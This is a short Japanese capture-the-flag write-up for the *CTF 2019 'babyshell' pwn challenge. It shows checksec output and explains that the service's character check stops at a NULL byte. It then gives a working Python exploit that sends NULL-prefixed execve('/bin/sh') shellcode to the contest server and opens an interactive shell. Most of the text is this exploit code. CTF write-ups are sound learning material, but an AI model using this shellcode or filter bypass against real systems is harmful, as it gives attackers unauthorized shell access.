# [pwn 240pts] babyshell - *CTF 2019
64ビットバイナリです。
```
$ checksec -f shellcode
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols      No	0		2	shellcode
```
シェルコードが実行できるサービスですが、特定の種類の文字コードしか使えません。
文字種のチェックがNULL終端なので、NULLから始まるシェルコードを送れば問題なく実行できます。

```python
from ptrlib import *

shellcode = b''
shellcode += b'\x00\xc0'
shellcode += b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'

#sock = Process(["stdbuf", "-o", "0", "./shellcode"])
sock = Socket("34.92.37.22", 10002)
sock.send(shellcode)
sock.interactive()
```
たぶんこれが一番速いと思います。

他の人のwriteupを見ると、readを読んでシェルコードを読み込み、それを実行するというのが正攻法っぽいです。
でもやはりシェルコードにNULLを入れてjmpしている人もいました。

# 感想
これは出題ミスというか非想定解なのでは？
